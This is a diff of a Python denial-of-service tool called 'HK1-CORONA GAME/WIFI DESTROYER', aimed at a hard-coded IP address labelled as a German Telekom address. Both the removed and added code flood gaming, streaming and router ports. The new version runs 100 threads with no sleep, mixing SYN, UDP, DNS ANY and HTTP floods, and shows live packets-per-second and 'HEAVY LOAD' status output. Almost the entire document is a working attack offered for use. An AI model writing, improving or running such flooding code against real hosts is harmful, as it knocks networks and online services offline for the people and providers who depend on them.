@@ -4,195 +4,164 @@ import time
 import random
 import struct
 
-target_ip = "62.109.121.42"  # ROUTER IP
-GAMING_PORTS = [3074, 3478, 3479, 3480, 27014, 27015, 27016, 27017, 27018, 25565]
-STREAMING_PORTS = [80, 443, 1935, 554, 8554]
-DNS_PORT = 53
+target_ip = "62.109.121.42"  # German Telekom IP
+GAMING_PORTS = [3074, 3478, 3479, 3480, 27014, 27015, 27016, 27017, 27018, 25565, 3724, 6112, 2302, 2303, 2304, 2305, 6667, 27960, 28960, 29900]
+STREAMING_PORTS = [80, 443, 1935, 554, 8554, 8080, 8443]
+ROUTER_PORTS = [53, 67, 68, 161, 162, 23, 22, 21, 69, 123, 137, 138, 139, 445, 1900, 2869, 5353, 7547, 8081, 8444]
 
-GREEN = '\033[92m'
 RED = '\033[91m'
+GREEN = '\033[92m'
+YELLOW = '\033[93m'
 CYAN = '\033[96m'
+MAGENTA = '\033[95m'
 RESET = '\033[0m'
 
-# Gaming destruction payloads
-def gaming_kill_1():
-    """UDP to Xbox Live port (3074) with fake NAT data"""
-    return b'\x00' * 128
-
-def gaming_kill_2():
-    """PlayStation Network flood (3478-3480)"""
-    return b'\xff' * 256
-
-def gaming_kill_3():
-    """Steam game session flood"""
-    return b'\xaa' * 512
-
-def gaming_kill_4():
-    """Minecraft server (25565) ping flood"""
-    return b'\xfe\xfd\x09' + b'\x00' * 125
-
-def gaming_kill_5():
-    """Discord voice (UDP 3478-3480)"""
-    return b'\x02' * 64
-
-def gaming_kill_6():
-    """Twitch stream interrupt (1935 RTMP)"""
-    return b'RTMP' + b'\x00' * 124
-
-def gaming_kill_7():
-    """YouTube streaming (443) TLS alert"""
-    return b'\x15\x03\x03\x00\x02\x02\x46'
-
-def gaming_kill_8():
-    """Netflix/Prime video (80/443) session kill"""
-    return b'GET / HTTP/1.1\r\n\r\n'
-
-def gaming_kill_9():
-    """DNS gaming server resolution poison"""
-    domain = random.choice(['xboxlive.com', 'psn.com', 'steam.com', 'minecraft.net'])
-    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 1, 0, 0, 0)
-    query += b''.join(struct.pack('B', len(part)) + part.encode() for part in domain.split('.'))[:-1]
-    query += b'\x00\x00\x01\x00\x01'
-    return query
-
-def gaming_kill_10():
-    """ICMP ping flood to gaming server IPs"""
-    return b'\x08\x00\xf7\xff' + b'\x00' * 56
-
-# Router CPU killer payloads
-def router_crash_1():
-    """SYN to all router admin ports"""
+# MASSIVE ATTACK PAYLOADS
+def create_syn_bomb():
     return b''
 
-def router_crash_2():
-    """UDP to router DHCP (67/68)"""
-    return b'\x00' * 300
+def create_udp_bomb():
+    return random.randbytes(1472)  # Max UDP before fragmentation
 
-def router_crash_3():
-    """DNS NXDOMAIN bomb to router DNS"""
-    return b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07invalid\x03com\x00\x00\x01\x00\x01'
+def create_dns_bomb():
+    # DNS ANY query for huge response
+    domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12)) + '.com'
+    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 1, 0, 0, 0)
+    query += b''.join(struct.pack('B', len(part)) + part.encode() for part in domain.split('.'))[:-1]
+    query += b'\x00\x00\xff\x00\x01'  # ANY query
+    return query
 
-def router_crash_4():
-    """HTTP flood to router web interface"""
-    return b'GET / HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n'
+def create_http_bomb():
+    return b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\nX-Forwarded-For: ' + b','.join([b'1.1.1.' + str(i).encode() for i in range(100)]) + b'\r\n\r\n'
 
-def router_crash_5():
-    """UDP to random high ports (state table exhaustion)"""
-    return b'X' * 1024
-
-GAMING_PAYLOADS = [gaming_kill_1, gaming_kill_2, gaming_kill_3, gaming_kill_4, gaming_kill_5,
-                   gaming_kill_6, gaming_kill_7, gaming_kill_8, gaming_kill_9, gaming_kill_10]
-
-ROUTER_PAYLOADS = [router_crash_1, router_crash_2, router_crash_3, router_crash_4, router_crash_5]
+def create_icmp_bomb():
+    return b'\x08\x00\xf7\xff' + b'\x00' * 1472
 
 # Stats
-stats = {"gaming_hits": 0, "router_hits": 0, "data_sent": 0}
+stats = {"packets": 0, "data": 0, "threads": 0}
 lock = threading.Lock()
+running = True
 
-def gaming_interrupt():
-    """Direct attack on gaming/streaming traffic"""
-    while True:
+# MASSIVE ATTACK THREADS (1000+ PPS)
+def mega_attack_thread(thread_id):
+    global running
+    packet_count = 0
+    data_count = 0
+    
+    while running:
         try:
-            port = random.choice(GAMING_PORTS + STREAMING_PORTS)
-            payload_func = random.choice(GAMING_PAYLOADS)
-            payload = payload_func()
+            attack_type = random.randint(1, 4)
+            port = random.choice(GAMING_PORTS + STREAMING_PORTS + ROUTER_PORTS)
             
-            if port in [80, 443, 1935]:
-                # TCP for streaming
+            if attack_type == 1:  # SYN flood
                 for _ in range(50):
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(0.01)
+                    sock.settimeout(0.001)
                     sock.connect_ex((target_ip, port))
-                    sock.send(payload)
                     sock.close()
-                    
-                    with lock:
-                        stats["gaming_hits"] += 1
-                        stats["data_sent"] += len(payload)
-            else:
-                # UDP for gaming
+                    packet_count += 1
+                    data_count += 64
+            
+            elif attack_type == 2:  # UDP flood
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                payload = create_udp_bomb()
                 for _ in range(50):
                     sock.sendto(payload, (target_ip, port))
-                    
-                    with lock:
-                        stats["gaming_hits"] += 1
-                        stats["data_sent"] += len(payload)
+                    packet_count += 1
+                    data_count += len(payload)
                 sock.close()
-                
-        except:
-            pass
-        time.sleep(0.01)
-
-def router_cripple():
-    """Crash router CPU/DNS"""
-    while True:
-        try:
-            payload_func = random.choice(ROUTER_PAYLOADS)
-            payload = payload_func()
             
-            if payload_func.__name__ == "router_crash_1":
-                # SYN flood to admin ports
-                for port in [80, 443, 23, 22, 8080]:
-                    for _ in range(25):
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(0.01)
-                        sock.connect_ex((target_ip, port))
-                        sock.close()
-                        
-                        with lock:
-                            stats["router_hits"] += 1
-                            stats["data_sent"] += 64
-            elif payload_func.__name__ == "router_crash_3":
-                # DNS bomb
+            elif attack_type == 3:  # DNS flood
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                for _ in range(100):
-                    sock.sendto(payload, (target_ip, DNS_PORT))
-                    
-                    with lock:
-                        stats["router_hits"] += 1
-                        stats["data_sent"] += len(payload)
+                payload = create_dns_bomb()
+                for _ in range(50):
+                    sock.sendto(payload, (target_ip, 53))
+                    packet_count += 1
+                    data_count += len(payload)
                 sock.close()
-            else:
-                # General UDP flood
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                port = random.randint(10000, 60000)
-                for _ in range(100):
-                    sock.sendto(payload, (target_ip, port))
-                    
-                    with lock:
-                        stats["router_hits"] += 1
-                        stats["data_sent"] += len(payload)
+            
+            elif attack_type == 4:  # HTTP flood
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.001)
+                sock.connect_ex((target_ip, 80))
+                payload = create_http_bomb()
+                sock.send(payload)
                 sock.close()
-                
+                packet_count += 1
+                data_count += len(payload)
+            
+            # Update stats every 100 packets
+            if packet_count >= 100:
+                with lock:
+                    stats["packets"] += packet_count
+                    stats["data"] += data_count
+                packet_count = 0
+                data_count = 0
+            
         except:
             pass
-        time.sleep(0.01)
+        
+        # No sleep = MAXIMUM PPS
 
-# Start attacks
-threading.Thread(target=gaming_interrupt, daemon=True).start()
-threading.Thread(target=router_cripple, daemon=True).start()
-
-print(f"{RED}HK1-CORONA GAME/WIFI DESTROYER{RESET}")
-print(f"{CYAN}Target Router: {target_ip}{RESET}")
-print(f"{RED}Gaming Ports: {GAMING_PORTS}{RESET}")
-print(f"{RED}Streaming Ports: {STREAMING_PORTS}{RESET}")
+# Start 100 ATTACK THREADS
+print(f"{RED}STARTING 100-THREAD NUKER{RESET}")
+print(f"{YELLOW}Target: {target_ip} (German Telekom){RESET}")
+print(f"{MAGENTA}Gaming Ports: {len(GAMING_PORTS)} | Streaming: {len(STREAMING_PORTS)} | Router: {len(ROUTER_PORTS)}{RESET}")
+print(f"{RED}Expected: 10,000+ PPS{RESET}")
 print()
 
+for i in range(100):
+    threading.Thread(target=mega_attack_thread, args=(i,), daemon=True).start()
+    stats["threads"] += 1
+    if i % 20 == 0:
+        print(f"{GREEN}Started {i+1}/100 attack threads{RESET}")
+
+# MONITOR
+last_packets = 0
 last_time = time.time()
-while True:
-    time.sleep(5)
-    
-    with lock:
-        gaming = stats["gaming_hits"]
-        router = stats["router_hits"]
-        data_mb = stats["data_sent"] / (1024 * 1024)
+max_pps = 0
+
+print(f"\n{CYAN}HK1-CORONA FULL POWER{RESET}")
+print(f"{RED}ATTACKING: {target_ip}{RESET}")
+print()
+
+try:
+    while True:
+        time.sleep(5)
         
-        stats["gaming_hits"] = 0
-        stats["router_hits"] = 0
-        stats["data_sent"] = 0
-    
-    total = gaming + router
-    print(f"HK1:{GREEN}{total}{RESET}:{GREEN}{data_mb:.2f}MB{RESET}")
-    print(f"{CYAN}Gaming Hits: {RED}{gaming}{RESET} | Router Hits: {RED}{router}{RESET}")
-    print()
+        with lock:
+            current_packets = stats["packets"]
+            current_data = stats["data"]
+            stats["packets"] = 0
+            stats["data"] = 0
+        
+        current_time = time.time()
+        time_diff = current_time - last_time
+        pps = int((current_packets - last_packets) / time_diff) if time_diff > 0 else 0
+        
+        if pps > max_pps:
+            max_pps = pps
+        
+        data_mb = current_data / (1024 * 1024)
+        
+        # COLOR BASED ON POWER
+        if pps < 1000:
+            pps_color = RED
+        elif pps < 5000:
+            pps_color = YELLOW
+        else:
+            pps_color = GREEN
+        
+        print(f"HK1:{pps_color}{pps:,}{RESET}:{GREEN}{data_mb:.2f}MB{RESET}")
+        print(f"{CYAN}Threads: {stats['threads']} | Max PPS: {max_pps:,}{RESET}")
+        print(f"{MAGENTA}Target Status: {RED}HEAVY LOAD{RESET if pps > 3000 else YELLOW if pps > 1000 else RED}")
+        print()
+        
+        last_packets = current_packets
+        last_time = current_time
+        
+except KeyboardInterrupt:
+    running = False
+    print(f"\n{RED}ATTACK STOPPED{RESET}")
+    print(f"{YELLOW}Final Max PPS: {max_pps:,}{RESET}")
+    print(f"{CYAN}Total attack threads: {stats['threads']}{RESET}")
